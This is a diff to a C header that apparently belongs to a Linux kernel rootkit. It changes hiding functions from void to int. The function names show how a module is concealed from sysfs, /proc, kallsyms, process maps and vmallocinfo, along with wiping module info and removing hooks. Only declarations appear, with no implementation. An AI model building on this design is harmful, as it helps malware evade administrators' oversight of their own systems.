@@ -35,16 +35,16 @@ struct neverc_krt_vis_state {
 
 int neverc_krt_vis_init(void);
 
-void neverc_krt_vis_filter(struct neverc_krt_vis_state *state,
-			 struct neverc_krt_this_module *mod);
+int neverc_krt_vis_filter(struct neverc_krt_vis_state *state,
+			  struct neverc_krt_this_module *mod);
 
-void neverc_krt_vis_restore(struct neverc_krt_vis_state *state,
-			 struct neverc_krt_this_module *mod);
+int neverc_krt_vis_restore(struct neverc_krt_vis_state *state,
+			   struct neverc_krt_this_module *mod);
 
 int neverc_krt_vis_is_filtered(const struct neverc_krt_vis_state *state);
 
-void neverc_krt_vis_sysfs_remove(struct neverc_krt_vis_state *state,
-				 struct neverc_krt_this_module *mod);
+int neverc_krt_vis_sysfs_remove(struct neverc_krt_vis_state *state,
+				struct neverc_krt_this_module *mod);
 
 int neverc_krt_vis_proc_filter(struct neverc_krt_vis_state *state,
 			       const char *module_name);
@@ -52,9 +52,9 @@ int neverc_krt_vis_proc_filter(struct neverc_krt_vis_state *state,
 int neverc_krt_vis_kallsyms_filter(struct neverc_krt_vis_state *state,
 				   const char *module_name);
 
-void neverc_krt_vis_filter_full(struct neverc_krt_vis_state *state,
-			      struct neverc_krt_this_module *mod,
-			      const char *module_name);
+int neverc_krt_vis_filter_full(struct neverc_krt_vis_state *state,
+			       struct neverc_krt_this_module *mod,
+			       const char *module_name);
 
 /* --- /proc/pid filtering --- */
 
@@ -85,7 +85,7 @@ void neverc_krt_vis_maps_filter_add_self(void);
 void neverc_krt_vis_wipe_modinfo(struct neverc_krt_this_module *mod);
 
 int neverc_krt_vis_pause_interposes(void);
-void neverc_krt_vis_remove_interposes(void);
+int neverc_krt_vis_remove_interposes(void);
 
 /* --- /proc/vmallocinfo filter --- */
 
